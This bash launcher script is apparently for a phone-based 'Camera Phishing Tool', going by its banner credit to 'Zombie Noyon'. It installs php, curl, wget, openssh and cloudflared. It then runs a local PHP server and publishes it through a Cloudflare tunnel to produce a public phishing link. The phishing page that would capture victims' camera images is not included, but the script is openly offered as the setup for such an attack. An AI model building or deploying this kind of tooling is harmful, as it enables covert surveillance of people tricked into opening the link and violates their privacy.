#!/bin/bash

clear
echo -e "\e[1;31m"
echo "███████╗ ██████╗ ███████╗██╗  ██╗    ███╗   ██╗ ██████╗ ██╗   ██╗ ███╗   ██╗"
echo "██╔════╝██╔═══██╗██╔════╝██║  ██║    ████╗  ██║██╔═══██╗██║   ██║ ████╗  ██║"
echo "█████╗  ██║   ██║███████╗███████║    ██╔██╗ ██║██║   ██║██║   ██║ ██╔██╗ ██║"
echo "██╔══╝  ██║   ██║╚════██║██╔══██║    ██║╚██╗██║██║   ██║██║   ██║ ██║╚██╗██║"
echo "██║     ╚██████╔╝███████║██║  ██║    ██║ ╚████║╚██████╔╝╚██████╔╝ ██║ ╚████║"
echo "╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝  ╚═╝  ╚═══╝"
echo -e "\e[1;32m          Camera Phishing Tool by Zombie Noyon\e[0m"
echo -e "\e[1;36m                TikTok: @cbx.noyon\e[0m"
echo -e "\e[1;33m===============================================\e[0m"
echo -e "\e[1;35m1)\e[0m Install Required Packages"
echo -e "\e[1;35m2)\e[0m Run Tool (Start Server + Cloudflare Link)"
echo -e "\e[1;35m3)\e[0m Exit"
echo -e "\e[1;33m===============================================\e[0m"
read -p $'\e[1;32mChoose an option: \e[0m' option

if [ "$option" = "1" ]; then
  echo -e "\e[1;34m[*] Installing required packages...\e[0m"
  pkg update -y && pkg install php curl wget openssh cloudflared -y
  echo -e "\e[1;32m[*] Packages installed. Press enter to continue...\e[0m"
  read
  bash start.sh

elif [ "$option" = "2" ]; then
  echo -e "\e[1;34m[*] Starting PHP server on port 8080...\e[0m"
  php -S 127.0.0.1:8080 > /dev/null 2>&1 &
  sleep 2
  echo -e "\e[1;34m[*] Starting Cloudflare tunnel...\e[0m"
  cloudflared tunnel --url http://127.0.0.1:8080

elif [ "$option" = "3" ]; then
  echo -e "\e[1;31mGoodbye!\e[0m"
  exit
else
  echo -e "\e[1;31mInvalid option!\e[0m"
fi
